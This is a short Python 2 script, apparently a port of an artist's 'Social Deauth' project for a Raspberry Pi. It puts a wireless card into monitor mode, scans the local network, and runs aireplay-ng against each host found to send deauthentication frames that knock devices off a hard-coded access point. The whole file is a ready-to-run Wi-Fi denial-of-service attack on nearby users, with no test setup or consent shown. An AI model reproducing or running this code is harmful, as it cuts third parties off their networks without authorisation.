# Testing a python version of Julian Oliver's "Social Deauth" script
# http://julianoliver.com/output/log_2013-02-12_16-55
# Designed to run on a Raspberry Pi
# Requires arp-scan and aireplay-ng

import subprocess
import os


def testing():
    try:
            make_mon = subprocess.call(['sudo','airmon-ng','start','wlan0','11'])
            scan = subprocess.check_output(['sudo','arp-scan','--localnet','--interface=mon0'])
            tscan = scan.split("\t")
            targets = tscan[1::2]
            for t in targets:
                test = subprocess.call(['sudo','aireplay-ng','-0','20','-a','00:3A:98:2B:FD:00','-c',str(t),'mon0','--ignore-negative-one'])
    except Exception, e:
            print "Error:", e





testing()

